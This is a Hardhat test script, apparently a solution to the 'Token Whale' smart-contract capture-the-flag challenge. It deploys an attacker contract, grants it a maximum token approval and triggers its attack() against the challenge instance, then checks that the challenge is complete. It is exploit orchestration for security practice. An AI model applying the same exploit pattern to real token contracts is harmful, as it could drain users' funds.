import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import {
    TokenWhaleChallenge,
    TokenWhaleAttacker,
    TokenWhaleAttacker__factory,
} from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { Signer, Wallet } from "ethers"
import "dotenv/config"

describe("Token Whale challenge", function () {
    let attacker: Wallet
    let target: TokenWhaleChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0x62F277C21243542d80c4420711afe499C3420698"
        attacker = new Wallet(
            process.env.METAMASK_PRIVATE_KEY!,
            ethers.provider
        )
        target = await ethers.getContractAt(
            "TokenWhaleChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Attacking contract", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum
        const attackerFactory: TokenWhaleAttacker__factory =
            await ethers.getContractFactory("TokenWhaleAttacker")
        const attackerContract: TokenWhaleAttacker = await (
            await attackerFactory.deploy(target.address)
        ).connect(attacker)
        console.log(`Attacker deployed at: ${attackerContract.address}`)

        tx = await target.approve(
            attackerContract.address,
            ethers.constants.MaxUint256
        )
        await tx.wait(1)

        console.log("Approved!")
        tx = await attackerContract.attack()
        await tx.wait(1)
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
